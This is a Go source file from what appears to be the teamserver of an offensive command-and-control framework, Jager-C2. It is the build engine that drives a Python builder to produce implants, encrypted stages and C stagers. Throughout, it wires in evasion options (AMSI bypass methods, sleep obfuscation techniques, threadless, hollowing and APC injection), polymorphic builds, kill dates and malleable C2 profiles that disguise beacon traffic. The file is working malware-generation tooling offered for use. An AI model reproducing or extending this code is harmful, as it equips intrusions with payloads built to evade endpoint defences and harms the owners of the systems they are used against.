package builds

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/0xhackerfren/Jager-C2/teamserver/internal/malleable"
	"go.uber.org/zap"
)

// EngineConfig points the teamserver at the polymorphic builder (artifact kit).
type EngineConfig struct {
	Workspace   string // repo root (contains builder/, profiles/, data/)
	Python      string // default python3
	BuilderPath string // path to build_implant.py
	Timeout     time.Duration
}

var validInjectMethods = map[string]bool{
	"none": true, "classic": true, "threadless": true, "hollow": true, "apc": true,
}

var validSleepTechniques = map[string]bool{
	"none": true, "basic": true, "timer": true, "zilean": true,
	"hwbp": true, "threadpool": true,
	"ekko": true, "foliage": true, // schema.yaml aliases
}

var validAmsiBypassMethods = map[string]bool{
	"hwbp": true, "pageguard": true, "patch": true,
}

// ValidateEvasionRequest rejects unknown evasion enum values before build.
func ValidateEvasionRequest(req BuildRequest) error {
	if req.InjectMethod != "" && !validInjectMethods[req.InjectMethod] {
		return fmt.Errorf("unknown injection method: %s", req.InjectMethod)
	}
	if req.SleepTechnique != "" && !validSleepTechniques[req.SleepTechnique] {
		return fmt.Errorf("unknown sleep technique: %s", req.SleepTechnique)
	}
	if req.AmsiBypassMethod != "" && !validAmsiBypassMethods[req.AmsiBypassMethod] {
		return fmt.Errorf("unknown amsi bypass method: %s", req.AmsiBypassMethod)
	}
	return nil
}

// BuildRequest mirrors Cobalt Strike payload generation options.
type BuildRequest struct {
	C2URL            string `json:"c2_url"`
	Format           string `json:"format"` // exe, dll, shellcode
	Arch             string `json:"arch"`   // x64, x86
	Sleep            int    `json:"sleep"`
	Jitter           int    `json:"jitter"`
	KillDate         int    `json:"kill_date"`
	Polymorphic      bool   `json:"polymorphic"`
	BuildStager      bool   `json:"build_stager"`
	ImplantBuild     string `json:"implant_build_id"` // stager-only
	EngagementID     string `json:"engagement_id"`
	ProfileTemplate  string `json:"profile_template"`
	BuildNonce       string `json:"build_nonce"`
	AmsiBypassMethod string `json:"amsi_bypass_method"` // hwbp, pageguard, patch
	SleepTechnique   string `json:"sleep_technique"`   // ekko, foliage, zilean
	InjectMethod     string `json:"inject_method"`     // threadless, classic
	Platform         string `json:"platform"`          // windows, linux
}

// BuildResult is parsed from build_implant.py --result-file JSON.
type BuildResult struct {
	Success            bool                   `json:"success"`
	BuildID            string                 `json:"build_id"`
	Error              string                 `json:"error,omitempty"`
	Implant            map[string]interface{} `json:"implant,omitempty"`
	Stager             map[string]interface{} `json:"stager,omitempty"`
	EncryptedStagePath string                 `json:"encrypted_stage_path,omitempty"`
	ProfileID          string                 `json:"profile_id,omitempty"`
	StageURL           string                 `json:"stage_url,omitempty"`
	ProfileOverlay     *ProfileOverlay        `json:"-"`
}

// ProfileOverlay is passed to build_implant.py --profile-json for per-build C2 shaping.
type ProfileOverlay struct {
	UserAgent     string `json:"user_agent"`
	CheckinPath   string `json:"checkin_path"`
	RegisterPath  string `json:"register_path"`
	ResultPath    string `json:"result_path"`
	StagePath     string `json:"stage1_path"`
	TunnelPath    string `json:"tunnel_path"`
	ProfileName        string `json:"profile_name"`
	ProfileFingerprint string `json:"profile_fingerprint"`
	BuildNonce         string `json:"build_nonce"`
	EngagementID       string `json:"engagement_id"`
}

type Engine struct {
	cfg    EngineConfig
	store  *Store
	logger *zap.Logger
}

func NewEngine(cfg EngineConfig, store *Store, logger *zap.Logger) *Engine {
	if cfg.Python == "" {
		cfg.Python = "python3"
	}
	if cfg.Timeout == 0 {
		cfg.Timeout = 15 * time.Minute
	}
	if cfg.BuilderPath == "" && cfg.Workspace != "" {
		cfg.BuilderPath = filepath.Join(cfg.Workspace, "builder", "build_implant.py")
	}
	return &Engine{cfg: cfg, store: store, logger: logger.Named("engine")}
}

func (e *Engine) GenerateImplant(req BuildRequest) (*BuildResult, error) {
	if err := ValidateEvasionRequest(req); err != nil {
		return nil, err
	}
	if req.C2URL == "" {
		return nil, fmt.Errorf("c2_url required")
	}
	if req.Format == "" {
		req.Format = "exe"
	}
	if req.Arch == "" {
		req.Arch = "x64"
	}
	if req.Sleep == 0 {
		req.Sleep = 60
	}
	if req.Jitter == 0 {
		req.Jitter = 20
	}

	result, err := e.runBuilder(req, true)
	if err != nil {
		return nil, err
	}
	if !result.Success {
		return result, fmt.Errorf("%s", result.Error)
	}

	if result.Implant == nil && result.BuildID != "" {
		// Backward compat: flat JSON from non-pipeline CLI
		result.Implant = map[string]interface{}{
			"build_id": result.BuildID,
		}
	}

	if err := e.ingestImplant(result); err != nil {
		return nil, err
	}
	return result, nil
}

// GeneratePipeline runs implant + encrypted stage + C stager (MinGW via build_implant.py --pipeline --build-stager).
func (e *Engine) GeneratePipeline(req BuildRequest) (*BuildResult, error) {
	if err := ValidateEvasionRequest(req); err != nil {
		return nil, err
	}
	req.BuildStager = true
	result, err := e.runBuilder(req, true)
	if err != nil {
		return nil, err
	}
	if !result.Success {
		return result, fmt.Errorf("%s", result.Error)
	}
	if err := e.ingestImplant(result); err != nil {
		return nil, err
	}
	if st, ok := result.Stager["build_id"].(string); ok && st != "" {
		e.registerStager(st, result.Stager, result.ProfileID)
	}
	return result, nil
}

// GenerateStager builds a C stager (x86_64-w64-mingw32-gcc via build_implant.py) for an existing implant.
func (e *Engine) GenerateStager(req BuildRequest) (*BuildResult, error) {
	if req.C2URL == "" {
		return nil, fmt.Errorf("c2_url required")
	}
	if req.ImplantBuild == "" {
		return nil, fmt.Errorf("implant_build_id required")
	}

	outFile, err := os.CreateTemp("", "jager-stager-result-*.json")
	if err != nil {
		return nil, err
	}
	resultPath := outFile.Name()
	outFile.Close()
	defer os.Remove(resultPath)

	args := []string{
		e.cfg.BuilderPath,
		"--c2-url", req.C2URL,
		"--output", e.store.BuildDir(),
		"--implant-build-id", req.ImplantBuild,
		"--result-file", resultPath,
	}
	if profilePath := e.findProfileForImplant(req.ImplantBuild); profilePath != "" {
		args = append(args, "--profile", profilePath)
	}

	if err := e.execPython(args); err != nil {
		return nil, err
	}

	var stager map[string]interface{}
	raw, err := os.ReadFile(resultPath)
	if err != nil {
		return nil, err
	}
	if err := json.Unmarshal(raw, &stager); err != nil {
		return nil, fmt.Errorf("parse stager result: %w", err)
	}

	ok, _ := stager["success"].(bool)
	if !ok {
		errMsg, _ := stager["error"].(string)
		return &BuildResult{Success: false, Error: errMsg}, fmt.Errorf("%s", errMsg)
	}

	buildID, _ := stager["build_id"].(string)
	e.registerStager(buildID, stager, "")

	return &BuildResult{
		Success: true,
		BuildID: buildID,
		Stager:  stager,
	}, nil
}

func (e *Engine) runBuilder(req BuildRequest, pipeline bool) (*BuildResult, error) {
	if req.Format == "" {
		req.Format = "exe"
	}
	if req.Arch == "" {
		req.Arch = "x64"
	}
	if req.Sleep == 0 {
		req.Sleep = 60
	}
	if req.Jitter == 0 {
		req.Jitter = 20
	}

	outFile, err := os.CreateTemp("", "jager-build-result-*.json")
	if err != nil {
		return nil, err
	}
	resultPath := outFile.Name()
	outFile.Close()
	defer os.Remove(resultPath)

	overlay, profileJSON, malleableJSON, err := e.prepareMalleableProfile(req)
	if err != nil {
		return nil, err
	}
	defer os.Remove(profileJSON)
	if malleableJSON != "" {
		defer os.Remove(malleableJSON)
	}

	args := []string{
		e.cfg.BuilderPath,
		"--c2-url", req.C2URL,
		"--output", e.store.BuildDir(),
		"--format", req.Format,
		"--arch", req.Arch,
		"--sleep", fmt.Sprintf("%d", req.Sleep),
		"--jitter", fmt.Sprintf("%d", req.Jitter),
		"--kill-date", fmt.Sprintf("%d", req.KillDate),
		"--result-file", resultPath,
		"--profile-json", profileJSON,
	}
	platform := req.Platform
	if platform == "" {
		platform = "windows"
	}
	args = append(args, "--platform", platform)

	if req.Polymorphic {
		args = append(args, "--polymorphic")
	} else {
		args = append(args, "--no-polymorphic")
	}
	if pipeline {
		args = append(args, "--pipeline")
		if req.BuildStager {
			args = append(args, "--build-stager")
		}
	}

	if err := e.execPython(args); err != nil {
		return nil, err
	}

	raw, err := os.ReadFile(resultPath)
	if err != nil {
		return nil, err
	}
	var result BuildResult
	if err := json.Unmarshal(raw, &result); err != nil {
		return nil, fmt.Errorf("parse build result: %w", err)
	}
	if overlay != nil {
		result.ProfileOverlay = overlay
	}
	if malleableJSON != "" {
		bid := result.BuildID
		if bid == "" && result.Implant != nil {
			bid, _ = result.Implant["build_id"].(string)
		}
		if bid != "" {
			e.persistMalleableProfile(bid, malleableJSON)
		}
	}
	return &result, nil
}

func (e *Engine) persistMalleableProfile(buildID, srcPath string) {
	if buildID == "" || srcPath == "" {
		return
	}
	data, err := os.ReadFile(srcPath)
	if err != nil {
		return
	}
	dest := filepath.Join(e.store.BuildDir(), fmt.Sprintf("malleable-%s.json", buildID))
	_ = os.WriteFile(dest, data, 0o644)
	// Latest profile for listener bridge
	_ = os.WriteFile(filepath.Join(e.store.BuildDir(), "profile.json"), data, 0o644)
}

func (e *Engine) prepareMalleableProfile(req BuildRequest) (*ProfileOverlay, string, string, error) {
	enginePath := filepath.Join(e.cfg.Workspace, "builder", "profile_engine.py")
	if _, err := os.Stat(enginePath); err != nil {
		return e.prepareMalleableProfileLegacy()
	}

	overlayFile, err := os.CreateTemp("", "jager-overlay-*.json")
	if err != nil {
		return nil, "", "", err
	}
	overlayPath := overlayFile.Name()
	overlayFile.Close()

	malleableFile, err := os.CreateTemp("", "jager-malleable-*.json")
	if err != nil {
		os.Remove(overlayPath)
		return nil, "", "", err
	}
	malleablePath := malleableFile.Name()
	malleableFile.Close()

	args := []string{
		enginePath,
		"--workspace", e.cfg.Workspace,
		"--overlay-out", overlayPath,
		"--malleable-out", malleablePath,
	}
	if req.EngagementID != "" {
		args = append(args, "--engagement-id", req.EngagementID)
	}
	if req.ProfileTemplate != "" {
		args = append(args, "--template", req.ProfileTemplate)
	}
	if req.BuildNonce != "" {
		args = append(args, "--build-nonce", req.BuildNonce)
	}

	cmd := exec.Command(e.cfg.Python, args...)
	cmd.Dir = e.cfg.Workspace
	if out, err := cmd.CombinedOutput(); err != nil {
		os.Remove(overlayPath)
		os.Remove(malleablePath)
		return nil, "", "", fmt.Errorf("profile_engine: %w: %s", err, string(out))
	}

	raw, err := os.ReadFile(overlayPath)
	if err != nil {
		os.Remove(overlayPath)
		os.Remove(malleablePath)
		return nil, "", "", err
	}
	var overlay ProfileOverlay
	if err := json.Unmarshal(raw, &overlay); err != nil {
		os.Remove(overlayPath)
		os.Remove(malleablePath)
		return nil, "", "", fmt.Errorf("parse overlay: %w", err)
	}
	if err := mergeEvasionIntoProfileFiles(overlayPath, malleablePath, req); err != nil {
		os.Remove(overlayPath)
		os.Remove(malleablePath)
		return nil, "", "", err
	}
	return &overlay, overlayPath, malleablePath, nil
}

func mergeEvasionIntoProfileFiles(overlayPath, malleablePath string, req BuildRequest) error {
	if err := ValidateEvasionRequest(req); err != nil {
		return err
	}
	if req.AmsiBypassMethod == "" && req.SleepTechnique == "" && req.InjectMethod == "" {
		return nil
	}
	for _, path := range []string{overlayPath, malleablePath} {
		if path == "" {
			continue
		}
		raw, err := os.ReadFile(path)
		if err != nil {
			return err
		}
		var doc map[string]interface{}
		if err := json.Unmarshal(raw, &doc); err != nil {
			return fmt.Errorf("parse profile %s: %w", path, err)
		}
		ev, _ := doc["evasion"].(map[string]interface{})
		if ev == nil {
			ev = map[string]interface{}{}
		}
		if req.AmsiBypassMethod != "" {
			ev["amsi_bypass_method"] = req.AmsiBypassMethod
		}
		if req.SleepTechnique != "" {
			ev["sleep_technique"] = req.SleepTechnique
		}
		if req.InjectMethod != "" {
			ev["inject_method"] = req.InjectMethod
		}
		doc["evasion"] = ev
		out, err := json.MarshalIndent(doc, "", "  ")
		if err != nil {
			return err
		}
		if err := os.WriteFile(path, out, 0o644); err != nil {
			return err
		}
	}
	return nil
}

func (e *Engine) prepareMalleableProfileLegacy() (*ProfileOverlay, string, string, error) {
	builtins := malleable.BuiltinProfiles()
	base, ok := builtins["default"]
	if !ok {
		return nil, "", "", fmt.Errorf("default malleable profile missing")
	}
	seed := time.Now().UnixNano()
	mutated := base.MutateForBuild(seed)

	checkin := firstURI(mutated.HTTPGet.URI, "/api/v1/checkin")
	register := firstURI(mutated.HTTPPost.URI, "/api/v1/register")
	resultPath := secondURI(mutated.HTTPPost.URI, register+"/result")
	if resultPath == register+"/result" && len(mutated.HTTPPost.URI) > 1 {
		resultPath = mutated.HTTPPost.URI[1]
	}
	stage := firstURI(mutated.HTTPStager.URI, "/api/v1/stage")
	tunnel := thirdURI(mutated.HTTPPost.URI, "/api/v1/tunnel")

	overlay := &ProfileOverlay{
		UserAgent:    mutated.UserAgent,
		CheckinPath:  checkin,
		RegisterPath: register,
		ResultPath:   resultPath,
		StagePath:    stage,
		TunnelPath:   tunnel,
		ProfileName:  mutated.Name,
	}

	tmp, err := os.CreateTemp("", "jager-profile-*.json")
	if err != nil {
		return nil, "", "", err
	}
	path := tmp.Name()
	enc := json.NewEncoder(tmp)
	enc.SetIndent("", "  ")
	if err := enc.Encode(overlay); err != nil {
		tmp.Close()
		os.Remove(path)
		return nil, "", "", err
	}
	tmp.Close()
	return overlay, path, "", nil
}

func firstURI(uris []string, fallback string) string {
	if len(uris) > 0 && uris[0] != "" {
		return uris[0]
	}
	return fallback
}

func secondURI(uris []string, fallback string) string {
	if len(uris) > 1 && uris[1] != "" {
		return uris[1]
	}
	return fallback
}

func thirdURI(uris []string, fallback string) string {
	if len(uris) > 2 && uris[2] != "" {
		return uris[2]
	}
	return fallback
}

func (e *Engine) execPython(args []string) error {
	if _, err := os.Stat(e.cfg.BuilderPath); err != nil {
		return fmt.Errorf("builder not found at %s: %w", e.cfg.BuilderPath, err)
	}

	ctx := context.Background()
	if e.cfg.Timeout > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, e.cfg.Timeout)
		defer cancel()
	}

	cmd := exec.CommandContext(ctx, e.cfg.Python, args...)
	cmd.Dir = e.cfg.Workspace
	cmd.Env = append(os.Environ(),
		fmt.Sprintf("JAGER_BUILDS=%s", e.store.BuildDir()),
		fmt.Sprintf("PYTHONPATH=%s", e.cfg.Workspace),
	)
	out, err := cmd.CombinedOutput()
	if len(out) > 0 {
		e.logger.Info("builder output", zap.String("log", string(out)))
	}
	if err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return fmt.Errorf("builder timed out after %s", e.cfg.Timeout)
		}
		return fmt.Errorf("builder failed: %w", err)
	}
	return nil
}

func (e *Engine) findProfileForImplant(implantBuildID string) string {
	if implantBuildID == "" {
		return ""
	}
	buildDir := e.store.BuildDir()
	matches, _ := filepath.Glob(filepath.Join(buildDir, fmt.Sprintf("implant-%s-*.json", implantBuildID)))
	for _, metaPath := range matches {
		raw, err := os.ReadFile(metaPath)
		if err != nil {
			continue
		}
		var meta map[string]interface{}
		if err := json.Unmarshal(raw, &meta); err != nil {
			continue
		}
		if pid, ok := meta["profile_id"].(string); ok && pid != "" {
			candidate := filepath.Join(buildDir, fmt.Sprintf("profile-%s.json", pid))
			if _, err := os.Stat(candidate); err == nil {
				return candidate
			}
		}
	}
	fallback := filepath.Join(buildDir, "profile.json")
	if _, err := os.Stat(fallback); err == nil {
		return fallback
	}
	return ""
}

func (e *Engine) ingestImplant(result *BuildResult) error {
	if result.Implant == nil {
		if result.BuildID == "" {
			return fmt.Errorf("implant metadata missing")
		}
		result.Implant = map[string]interface{}{
			"build_id": result.BuildID,
		}
	}

	buildID, _ := result.Implant["build_id"].(string)
	if buildID == "" {
		buildID = result.BuildID
	}
	savePath, _ := result.Implant["path"].(string)

	// Relativize absolute paths against the build directory
	if savePath != "" && filepath.IsAbs(savePath) {
		if rel, err := filepath.Rel(e.store.BuildDir(), savePath); err == nil && !strings.HasPrefix(rel, "..") {
			savePath = rel
		} else {
			savePath = filepath.Base(savePath)
		}
	}

	format, _ := result.Implant["format"].(string)
	if format == "" {
		format = "exe"
	}
	platform := inferBuildPlatform(result)
	if platform == "linux" && format == "exe" {
		format = "elf"
	}

	if err := e.store.RegisterWithMeta(buildID, "implant", format, result.ProfileID, savePath, BuildMeta{
		Seed:        overlaySeed(result),
		ProfileHash: overlayProfileHash(result),
		Platform:    platform,
		ConfigJSON:  configJSONString(result),
	}); err != nil {
		return fmt.Errorf("register implant: %w", err)
	}
	if result.ProfileOverlay != nil {
		malleablePath := filepath.Join(e.store.BuildDir(), fmt.Sprintf("malleable-%s.json", buildID))
		if _, err := os.Stat(malleablePath); os.IsNotExist(err) {
			malleablePath = filepath.Join(e.store.BuildDir(), "profile.json")
		}
		_ = LoadAndRegisterMalleableProfile(
			buildID,
			malleablePath,
			result.ProfileOverlay.CheckinPath,
			result.ProfileOverlay.RegisterPath,
			result.ProfileOverlay.ResultPath,
			result.ProfileOverlay.StagePath,
			result.ProfileOverlay.TunnelPath,
		)
		cfgBytes, _ := json.Marshal(result.ProfileOverlay)
		e.store.UpdateConfig(buildID, cfgBytes)
	}

	encPath := result.EncryptedStagePath
	if encPath == "" {
		return nil
	}
	data, err := os.ReadFile(encPath)
	if err != nil {
		return fmt.Errorf("read encrypted stage: %w", err)
	}
	e.store.StoreStagePayload(buildID, data)
	result.BuildID = buildID
	stagePath := "/api/v1/stage"
	if result.ProfileOverlay != nil && result.ProfileOverlay.StagePath != "" {
		stagePath = result.ProfileOverlay.StagePath
	}
	result.StageURL = fmt.Sprintf("%s?id=%s", stagePath, buildID)
	return nil
}

func (e *Engine) registerStager(buildID string, meta map[string]interface{}, profile string) {
	savePath, _ := meta["path"].(string)
	if savePath != "" && filepath.IsAbs(savePath) {
		if rel, err := filepath.Rel(e.store.BuildDir(), savePath); err == nil && !strings.HasPrefix(rel, "..") {
			savePath = rel
		} else {
			savePath = filepath.Base(savePath)
		}
	}
	_ = e.store.RegisterWithMeta(buildID, "stager", "exe", profile, savePath, BuildMeta{Platform: "windows"})
}

func overlaySeed(result *BuildResult) string {
	if result.ProfileOverlay != nil {
		return result.ProfileOverlay.BuildNonce
	}
	return ""
}

func overlayProfileHash(result *BuildResult) string {
	if result.ProfileOverlay != nil {
		return result.ProfileOverlay.ProfileFingerprint
	}
	return ""
}

func inferBuildPlatform(result *BuildResult) string {
	if result.Implant != nil {
		if platform, ok := result.Implant["platform"].(string); ok && platform != "" {
			return platform
		}
		if _, ok := result.Implant["arch"].(string); ok {
			if format, ok := result.Implant["format"].(string); ok && (format == "elf" || format == "so") {
				return "linux"
			}
		}
	}
	return "windows"
}

func configJSONString(result *BuildResult) string {
	if result.ProfileOverlay == nil {
		return ""
	}
	b, err := json.Marshal(result.ProfileOverlay)
	if err != nil {
		return ""
	}
	return string(b)
}
